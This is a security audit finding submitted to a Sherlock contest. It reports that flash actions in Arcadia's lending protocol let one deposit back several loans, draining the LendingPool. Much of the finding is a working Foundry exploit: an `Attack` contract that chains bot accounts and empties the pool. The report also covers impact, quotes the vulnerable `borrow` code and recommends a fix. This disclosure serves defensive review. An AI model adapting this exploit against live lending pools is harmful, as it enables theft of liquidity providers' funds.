Rhythmic Seaweed Hedgehog

high

# Flash loans can trick the `LendingPool` into issuing debt backed by its own collateral.

## Summary

Accounts can use flash-loaned funds as [borrow](https://github.com/sherlock-audit/2023-12-arcadia/blob/de7289bebb3729505a2462aa044b3960d8926d78/lending-v2/src/LendingPool.sol#L414) collateral from a [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol) [without tripping the health check](https://github.com/sherlock-audit/2023-12-arcadia/blob/de7289bebb3729505a2462aa044b3960d8926d78/accounts-v2/src/accounts/AccountV1.sol#L660), allowing collateral backing to be migrated directly into attacker-controlled accounts, where the only collateral at risk is that belonging to the [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol) itself.

Further, it can be demonstrated that the underlying balance of the [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol) can be drained at zero cost to an attacker, resulting in the failure to liquidate active positions due to insolvency.

## Vulnerability Detail

Let's start by demonstration.

First, we append the following attack sequence to [`Borrow.fuzz.t.sol`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/test/fuzz/LendingPool/Borrow.fuzz.t.sol):

```solidity
function test_sherlock_drain() public {

  /// @dev Declare our attacker.
  address _ATTACKER = address(0x69);

  /// @dev Here we declare the number of bot accounts to use.
  /// We're doing this to make the math a little bit simpler,
  /// since we don't need to write special handlers for dust
  /// liquidity in a target pool.
  /// You can scale this arbitrarly.
  uint256 numberOfBots = 2;

  /// @dev Here we assume the attacker has some liquidity.
  uint256 attackLiquidity = 1 ether;

  /// @dev Here we assume the initial liquidity of the pool.
  /// We'll initialize this using the `liquidityProvider`,
  /// although we can just assume this to be the aggregate
  /// liquidity of lots of users.
  uint256 liquidity = (numberOfBots * attackLiquidity) / 2;

  /// @dev Prepare token approvals for the liquidity provider
  /// and initialize the attacker's initial balance.
  vm.startPrank(users.liquidityProvider);
  mockERC20.stable1.approve(address(pool), type(uint256).max);
  mockERC20.stable1.transfer(_ATTACKER, attackLiquidity);
  vm.stopPrank();

  /// @dev Deposit the liquidity into the senior tranche.
  vm.prank(address(srTranche));
  pool.depositInLendingPool(liquidity, users.liquidityProvider);

  assertEq(mockERC20.stable1.balanceOf(address(pool)), liquidity);

  vm.startPrank(_ATTACKER);

  /// @dev Deploy the attack contract.
  Attack attack = new Attack(factory, pool, mockERC20.stable1);

  /// @dev Fund the attack liquidity.
  mockERC20.stable1.transfer(address(attack), attackLiquidity);
  /// @dev Accumulate a number of bot accounts.
  attack.prepareAccounts(numberOfBots) /* accumulate_bots */;

  /// @dev Begin the attack.
  attack.rekt();

  /// @notice At this stage, the pool has been emptied, and each account
  /// is left in possession of their borrowed collateral.
  assertEq(mockERC20.stable1.balanceOf(address(pool)), 0) /* pool_drained */;
  assertEq(mockERC20.stable1.balanceOf(address(attack)), attackLiquidity) /* no_loss_for_attacker_besides_gas */;

  vm.stopPrank();

}
```

A high-level description of the operations is defined below:

1.  We prepare the `_ATTACKER` with `attackLiquidity` (`10 ** 18`) of underlying tokens.
2. We also prepare the [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol) with a deposit of `(numberOfBots * attackLiquidity) / 2` of underlying collateral via the `srTranche`. Note that here, we are choosing values which simplify the logical operations involved (an attacker would need to care to handle dust amounts).
3. The `_ATTACKER` deploys the `Attack` contract and preallocates a number of "bot" accounts in the interest of reducing gas consumption during the main attack flow.
4. After executing `rekt()`, we can verify that the amount of collateral belonging to the custom `Attack` contract (and therefore the `_ATTACKER`) is equivalent to the original `attackLiquidity`, signifying zero loss for the `_ATTACKER` besides gas. Conversely, we demonstrate that the balance of the [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol) is now `0`.

What has happened is the `Attacker` contract has borrowed all of the [`LendingPool`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol)'s underlying collateral in exchange for nothing in return.

Below, we declare the `Attack` contract (within the same scope of  [`Borrow.fuzz.t.sol`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/test/fuzz/LendingPool/Borrow.fuzz.t.sol)):

```solidity
contract Attack {

  /// @dev Address of the factory.
  Factory private immutable _FACTORY;
  /// @dev Address of the pool we intend to target.
  LendingPoolExtension private immutable _POOL;
  /// @dev The collateral token.
  ERC20Mock private immutable _TOKEN;

  /// @dev Array of bot accounts pre-allocated by the attacker.
  /// Can be accumulated during a preliminary phase, therefore
  /// unconstrainted by gas when preparing these.
  address[] private _accounts;

  /// @dev Attack depth tracker.
  uint256 private _attackDepth;

  /// @param factory The factory address.
  /// @param pool The target of the attack.
  /// @param token The collateral token.
  constructor(
    Factory factory,
    LendingPoolExtension pool,
    ERC20Mock token
  ) {
    _FACTORY = factory;
    _POOL = pool;
    _TOKEN = token;
  }

  /// @param numAccounts Number of bot accounts to create.
  function prepareAccounts(
    uint256 numAccounts
  ) external {

    for (uint256 i; i < numAccounts; i++) {

      /// @dev Create a new bot account.
      address account = _FACTORY.createAccount({
        salt: i + 0x69,
        accountVersion: 0,
        creditor: address(_POOL)
      });

      /// @dev Track the account.
      _accounts.push(account);
      /// @dev Ensure token approvals.
      _TOKEN.approve(account, type(uint256).max);

    }
     
  }

  function _emptyActionData() internal returns (ActionData memory emptyActionData) {
    address[] memory emptyAddresses = new address[](0);
    uint256[] memory emptyUints = new uint256[](0);
    emptyActionData = ActionData(emptyAddresses, emptyUints, emptyUints, emptyUints);
  }

  /// @dev Exploits the contract.
  function rekt() external {
    executeAction("");
  }

  function _withdrawAndSkim(address account, uint256 amountToWithdraw) internal {

    AccountV1 currentAccount = AccountV1(account);

    /// @dev Have the account formally deposit the token.
    address[] memory assetAddresses = new address[](1);
    assetAddresses[0] = address(_TOKEN);
    uint256[] memory assetIds = new uint256[](1);
    uint256[] memory assetAmounts = new uint256[](1);
    assetAmounts[0] = amountToWithdraw;

    currentAccount.withdraw(assetAddresses, assetIds, assetAmounts);
    currentAccount.skim(address(_TOKEN), 0, 0);

  }

  /// @dev Handle a flash action invocation.
  function executeAction(bytes memory actionTargetData) public returns (ActionData memory returnDepositData) {

    uint256 tokenBalance = _TOKEN.balanceOf(address(this));

    /// @dev Have the account formally deposit the token.
    address[] memory assetAddresses = new address[](1);
    assetAddresses[0] = address(_TOKEN);
    uint256[] memory assetIds = new uint256[](1);
    uint256[] memory assetAmounts = new uint256[](1);
    assetAmounts[0] = 1 ether;

    /// @dev Fetch the current account for the given `attackDepth`.
    AccountV1 currentAccount = AccountV1(_accounts[_attackDepth]);

    /// @dev Deposit the attack liquidity.
    currentAccount.deposit(assetAddresses, assetIds, assetAmounts);

    /// @dev Let's see if we can use our tokens as borrow collateral.
    _POOL.borrow(0.5 ether, address(currentAccount), address(this), bytes3("KEK"));

    uint256[] memory assetTypes = new uint256[](1) /* [ERC-20] */;

    ActionData memory withdrawActionData = ActionData({
      assets: assetAddresses,
      assetIds: assetIds,
      assetAmounts: assetAmounts,
      assetTypes: assetTypes
    });

    // TODO: fix this, lazy
    uint256 myAttackDepth = _attackDepth;

    /// @dev Increase the attack depth to figure out where in the
    /// attack we currently rest.
    ++_attackDepth;

    if (_attackDepth < _accounts.length) {

      /// @dev Moment of truth.
      currentAccount.flashAction(
        address(this) /* `this.executeAction(bytes)` */,
        abi.encode(withdrawActionData, _emptyActionData(), "", "", "")
      );

    }

    /// @dev Withdraw excess funds after the attack has taken place.
    _withdrawAndSkim(_accounts[myAttackDepth], 0.5 ether);

    if (myAttackDepth > 0) {

      AccountV1 accountToSendTo = AccountV1(_accounts[myAttackDepth - 1]);

      /// @dev Expedite funds.
      _TOKEN.approve(address(accountToSendTo), type(uint256).max);

      uint256[] memory newAssetAmounts = new uint256[](1);
      newAssetAmounts[0] = withdrawActionData.assetAmounts[0];

      withdrawActionData.assetAmounts = newAssetAmounts;

      /// @dev Re-deposit the assets to make the callback happy.
      returnDepositData = withdrawActionData;

    }

    /// Once we are finished, verify the `currentAccount` still
    /// contains the borrowed amount.
    require(_TOKEN.balanceOf(address(currentAccount)) == 0.5 ether, "FAILED_TO_LOCK_LIQUIDITY");

  }

}
```

Description of attack flow:

1. After deploying and funding the `Attack` contract, we call `prepareAccounts` to preallocate a number of bot accounts.
2. To execute the attack, we call `rekt()` which in turn invokes `executeAction("")`, which matches the function identifier [required for receiving flash callbacks](https://github.com/sherlock-audit/2023-12-arcadia/blob/de7289bebb3729505a2462aa044b3960d8926d78/accounts-v2/src/accounts/AccountV1.sol#L654).
3. In the callback, we [deposit](https://github.com/sherlock-audit/2023-12-arcadia/blob/de7289bebb3729505a2462aa044b3960d8926d78/accounts-v2/src/accounts/AccountV1.sol#L818) the initial `attackLiquidity` and use this as borrow collateral.
4. If there's another existing account we can possibly deploy to, we flash loan the `attackLiquidity` to the attack contract and repeat the process again. The result is a daisy chain of contracts all using _identical collateral_ to open multiple borrow positions.
5. Once we run out of bots to delegate to, the pool is starved of collateral and the flash loan must be repaid. The original `attackLiquidity` amount is used to repay the flash loan opened for each previous account in the chain, leaving the borrowed amount remaining the bot account.

Once everything is all said and done, the attacker has lost no value, the pool's underlying token balance has been emptied, and all of the backing collateral has been separated out across multiple bot accounts.

In this scenario, each account is left with `0.5 ether` of underlying token balance and `0.5 ether` worth of [`DebtToken`](https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/DebtToken.sol)s.

The pool has issued debt backed by its own collateral, instead of the `_ATTACKER`'s.

## Impact

There are multiple vulnerabilities which can be enabled through this manipulation.

1. If we assume an ideal model with zero fee growth, the bot positions persist fully-collateralized and cannot be liquidated.
2. Assuming fee growth, the positions can grow illiquid and be exploited by an attacker in exchange for liquidation fees, enabling the attack to be repeatedly performed at profit.
3. Pool insolvency will prevent LPs from withdrawing their liquidity.
4. The significant lack of underlying collateral assets may lead to unprecedented outcomes in the case of a liquidation cascade or bank run.

## Code Snippet

```solidity
/**
 * @notice Takes out debt backed by collateral in an Arcadia Account.
 * @param amount The amount of underlying ERC20 tokens to be lent out.
 * @param account The address of the Arcadia Account backing the debt.
 * @param to The address who receives the lent out underlying tokens.
 * @param referrer A unique identifier of the referrer, who will receive part of the fees generated by this transaction.
 * @dev The sender might be different than the owner if they have the proper allowances.
 */
function borrow(uint256 amount, address account, address to, bytes3 referrer)
    external
    whenBorrowNotPaused
    processInterests
{
    // If Account is not an actual address of an Account, ownerOfAccount(address) will return the zero address.
    address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);
    if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();

    uint256 amountWithFee = amount + amount.mulDivUp(originationFee, ONE_4);

    // Check allowances to take debt.
    if (accountOwner != msg.sender) {
        uint256 allowed = creditAllowance[account][accountOwner][msg.sender];
        if (allowed != type(uint256).max) {
            creditAllowance[account][accountOwner][msg.sender] = allowed - amountWithFee;
        }
    }

    // Mint debt tokens to the Account.
    _deposit(amountWithFee, account);

    // Add origination fee to the treasury.
    unchecked {
        if (amountWithFee - amount > 0) {
            totalRealisedLiquidity = SafeCastLib.safeCastTo128(amountWithFee + totalRealisedLiquidity - amount);
            realisedLiquidityOf[treasury] += amountWithFee - amount;
        }
    }

    // UpdateOpenPosition checks that the Account indeed has opened a margin account for this Lending Pool and
    // checks that it is still healthy after the debt is increased with amountWithFee.
    // Reverts in Account if one of the checks fails.
    uint256 accountVersion = IAccount(account).increaseOpenPosition(maxWithdraw(account));
    if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();

    // Transfer fails if there is insufficient liquidity in the pool.
    asset.safeTransfer(to, amount);

    emit Borrow(account, msg.sender, to, amount, amountWithFee - amount, referrer);
}
```

## Tool used

Foundry

## Recommendation

Consider preventing the value of flash loaned assets from being taken into account whilst assessing borrower eligibility.
